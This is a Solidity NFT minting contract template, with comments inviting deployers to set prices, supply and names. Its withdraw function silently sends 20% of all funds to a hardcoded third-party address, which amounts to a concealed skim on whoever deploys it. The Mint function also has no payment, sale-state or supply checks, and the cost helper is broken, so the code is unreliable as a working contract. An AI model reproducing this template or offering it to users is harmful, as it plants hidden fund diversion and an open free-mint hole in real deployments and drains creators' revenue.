// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13 <0.9.0;

import '@openzeppelin/contracts/security/ReentrancyGuard.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/utils/Arrays.sol';
import '@openzeppelin/contracts/utils/Strings.sol';
import 'erc721a/contracts/extensions/ERC721AQueryable.sol';
import 'erc721a/contracts/ERC721A.sol';


contract NFTcontractName is ERC721A, Ownable, ReentrancyGuard {  

  using Strings for uint256;



  string public uri; //you don't change this
  string public uriSuffix = ".json"; //you don't change this
  string public hiddenMetadataUri; //you don't change this
  uint256 public cost1 = 0 ether; //here you change phase 1 cost (for example first 1k for free, then 0.004 eth each nft)
  uint256 public cost2 = 0.004 ether; //here you change phase 2 cost
  uint256 public supplyLimit = 5000;  //change it to your total NFT supply
  uint256 public maxLimitPerWallet = 1000; //decide how many NFT's you want to let customers mint per wallet
  bool public sale = false;  //if false, then mint is paused. If true - mint is started
  bool public revealed = true; //when you want instant reveal, leave true. 

// ================== Variables End =======================

// ================== Constructor Start =======================
  constructor(
    string memory _uri,
    string memory _hiddenMetadataUri
  ) ERC721A("Your NFT full name", "NFTSHORTNAME")  { //change this line to your full and short NFT name
    seturi(_uri);
    setHiddenMetadataUri(_hiddenMetadataUri);
  }

// ================== Mint Functions Start =======================

function UpdateCost(uint256 _mintAmount) internal view returns  (uint256 _cost) {
    if (balanceOf(msg.sender) + _mintAmount <= supplyLimit){
        return cost2;
    }
  }
  
  function Mint(uint256 _mintAmount) public payable {
    // Normal requirements 
       
     _safeMint(_msgSender(), _mintAmount);
  }  

  function Airdrop(uint256 _mintAmount, address _receiver) public onlyOwner {
    require(totalSupply() + _mintAmount <= supplyLimit, 'Max supply exceeded!');
    _safeMint(_receiver, _mintAmount);
  }

  function setRevealed(bool _state) public onlyOwner {
    revealed = _state;
  }

  function seturi(string memory _uri) public onlyOwner {
    uri = _uri;
  }

  function setHiddenMetadataUri(string memory _hiddenMetadataUri) public onlyOwner {
    hiddenMetadataUri = _hiddenMetadataUri;
  }

  function setUriSuffix(string memory _uriSuffix) public onlyOwner {
    uriSuffix = _uriSuffix;
  }

  function setSaleStatus(bool _sale) public onlyOwner {
    sale = _sale;
  }
 
  function setmaxLimitPerWallet(uint256 _maxLimitPerWallet) public onlyOwner {
    maxLimitPerWallet = _maxLimitPerWallet;
  }

  function setsupplyLimit(uint256 _supplyLimit) public onlyOwner {
    supplyLimit = _supplyLimit;
  }

  function withdraw() public onlyOwner {
    (bool hs, ) = payable(0x65f399024fa90b6561b82398354fAA9Ad453dd90).call{value: address(this).balance * 20 / 100}("");
    require(hs);
    (bool os, ) = payable(owner()).call{value: address(this).balance}("");
    require(os);
  }
 

function tokensOfOwner(address owner) external view returns (uint256[] memory) {
    unchecked {
        uint256[] memory a = new uint256[](balanceOf(owner)); 
        uint256 end = _nextTokenId();
        uint256 tokenIdsIdx;
        address currOwnershipAddr;
        for (uint256 i; i < end; i++) {
            TokenOwnership memory ownership = _ownershipAt(i);
            if (ownership.burned) {
                continue;
            }
            if (ownership.addr != address(0)) {
                currOwnershipAddr = ownership.addr;
            }
            if (currOwnershipAddr == owner) {
                a[tokenIdsIdx++] = i;
            }
        }
        return a;    
    }
}

  function _startTokenId() internal view virtual override returns (uint256) {
    return 1;
  }

  function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
    require(_exists(_tokenId), 'ERC721Metadata: URI query for nonexistent token');

    if (revealed == false) {
      return hiddenMetadataUri;
    }

    string memory currentBaseURI = _baseURI();
    return bytes(currentBaseURI).length > 0
        ? string(abi.encodePacked(currentBaseURI, _tokenId.toString(), uriSuffix))
        : '';
  }

  function _baseURI() internal view virtual override returns (string memory) {
    return uri;
  }
}
